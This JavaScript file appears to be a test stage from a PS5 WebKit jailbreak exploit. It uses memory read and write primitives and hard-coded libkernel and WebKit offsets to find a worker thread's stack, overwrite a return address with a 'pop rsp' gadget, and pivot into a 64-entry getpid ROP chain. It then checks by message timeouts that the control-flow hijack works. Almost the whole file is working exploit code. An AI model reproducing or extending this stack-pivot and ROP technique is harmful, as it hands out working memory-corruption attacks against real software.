// worker_spin_1340.js — pop-rsp-only test. Chain = 64x getpid (no WK gadgets but pop rsp).
// msg1 always ANSWERs (echo before hijack). msg2 at +800ms: TIMEOUT = spinning (ENTRY WORKS).
async function _wspin(){
  const say = async (s) => { try { await log("[wspin] " + s); } catch(e){} };
  const hx = (v) => { try { return "0x" + (BigInt(v) & 0xFFFFFFFFFFFFFFFFn).toString(16); } catch(e){ return "?"; } };
  const WK = BigInt(PS5.webkitBase||0), LK = BigInt(PS5.libkernelBase||0);
  let worker = null;
  try{
    worker = new Worker("payloads/worker_slave.js");
    await Promise.race([new Promise((res)=>{worker.onmessage=()=>res(1);worker.postMessage(0);}),
      new Promise((_,rej)=>setTimeout(()=>rej(new Error("t/o")),5000))]);
  }catch(e){ await say("ABORT handshake"); return; }
  let wstack = 0n;
  for(const h of [0x64218,0x6C218]){
    try{ let t=read64(LK+BigInt(h));
      for(let i=0;i<64&&t!==0n;i++){ if(read64(t+0xB0n)===0x80000n){ wstack=read64(t+0xA8n); break; } t=read64(t+0x38n); }
    }catch(e){}
    if(wstack) break;
  }
  const EXP = LK+0x1FD01n;
  let retslot = 0n, cnt = 0;
  try{ for(let o=0x7F000n;o<0x80000n;o+=8n){ if(read64(wstack+o)===EXP){ cnt++; if(!retslot) retslot=wstack+o; } } }catch(e){}
  if(cnt!==1){ await say("ABORT retfp="+cnt); return; }
  const cbase = malloc(0x1000);
  let entry = cbase+0x100n;
  if(entry&8n) entry += 8n;
  for(let i=0;i<64;i++) write64(entry+BigInt(i*8), LK+0x1B860n);
  await say("fire loop64 entry="+hx(entry));
  write64(retslot, WK+0xA1138n);
  write64(retslot+8n, entry);
  let a1 = "none";
  worker.onmessage = () => { a1 = "ANSWER"; };
  worker.postMessage(0);
  await new Promise((r)=>setTimeout(r,800));
  let a2 = "none";
  if(a1==="ANSWER"){
    worker.onmessage = () => { a2 = "ANSWER2"; };
    try{ worker.postMessage(0); }catch(e){ a2 = "POST-THREW"; }
    await new Promise((r)=>setTimeout(r,800));
    if(a2==="none") a2 = "TIMEOUT2";
  }
  const verdict = a2==="TIMEOUT2" ? "ENTRY WORKS (spinning in getpid loop)" : ("a1="+a1+" a2="+a2);
  await say("probe2 "+a2+" => "+verdict);
  try{ send_notification("wspin done"); }catch(e){}
}
_wspin();
